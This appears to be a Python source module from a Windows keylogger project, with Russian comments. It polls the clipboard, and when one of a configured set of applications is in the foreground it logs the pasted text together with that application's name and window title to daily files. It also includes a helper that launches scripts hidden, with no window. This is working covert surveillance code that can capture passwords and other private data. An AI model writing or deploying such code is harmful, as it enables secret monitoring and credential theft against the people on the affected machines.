import win32clipboard
import time
import threading
import os
import sys
import logging
import subprocess
import psutil
import win32gui
import win32process
from datetime import datetime
from .keylogger import load_config

config = load_config()
ALLOWED_PROCESSES = config.get("allowed_processes", [])
# Определяет директорию для логов (работает и в exe и в python)
def get_log_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

log_dir = os.path.join(get_log_dir(), "logs")
os.makedirs(log_dir, exist_ok=True)

# Запускает скрипт в фоновом режиме без окна
def start_background(script_name):
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    subprocess.Popen(
        [sys.executable, script_name],
        startupinfo=si,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
def get_log_file_path():
    today = datetime.now().strftime("%Y-%m-%d")
    return os.path.join(log_dir, f"{today}_keylog.txt")

 # Определяет какое приложение активно в данный момент
def get_active_console_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        proc = psutil.Process(pid)
        proc_name = proc.name().lower()
        if proc_name in ALLOWED_PROCESSES:
            window_title = win32gui.GetWindowText(hwnd)
            return proc_name, window_title
    except Exception:
        pass
    return None, None

# Читает текстовое содержимое буфера обмена
def get_clipboard_text():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return data.strip()
    except Exception:
        return None

# Бесконечный цикл мониторинга буфера обмена
def clipboard_monitor():
    last_data = ""
    while True:
        time.sleep(1.5)
        data = get_clipboard_text()
        if data and data != last_data:
            proc_name, window_title = get_active_console_info()
            if proc_name:
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_line = f"{now} - [{proc_name}] - \"{window_title}\" - PASTED: {data}"
                try:
                    with open(get_log_file_path(), "a", encoding="utf-8") as f:
                        f.write(log_line + "\n")
                except Exception:
                    logging.exception("Clipboard logger failed to write")
                last_data = data

#смотрим буфер обмена
def start_clipboard_logger():
    t = threading.Thread(target=clipboard_monitor, daemon=True)
    t.start()
